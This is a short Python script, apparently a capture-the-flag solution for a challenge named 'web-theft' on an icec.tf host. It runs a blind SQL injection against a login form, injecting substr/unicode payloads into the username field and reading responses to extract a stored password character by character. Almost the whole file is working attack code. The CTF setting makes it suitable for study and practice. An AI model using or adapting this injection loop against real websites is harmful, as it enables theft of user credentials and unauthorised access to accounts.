import requests
import string
import time

#' or substr(username,1,1)) = 'a' or '
ans=""
found = False
for i in range(1, 25):
        for num in range(0,150):
                username = f"' or substr(username,1,1) = 'a' and unicode(substr(password,{i},1)) = {num} or '"
                datafrag = f"' or substr(password,1,1) = '{num}' or '"
                #print(datafrag)
                #exit(1)
                data = {'username': username, 'password': "whocares"}
                url = "http://www.web-theft.vuln.icec.tf/"
                r=requests.post(url, data=data)
                if "Invalid password!" in r.text:
                        ans+=chr(num)
                        print("New Hit!")
                        print(ans)
                #print(r.text)
                #time.sleep(1)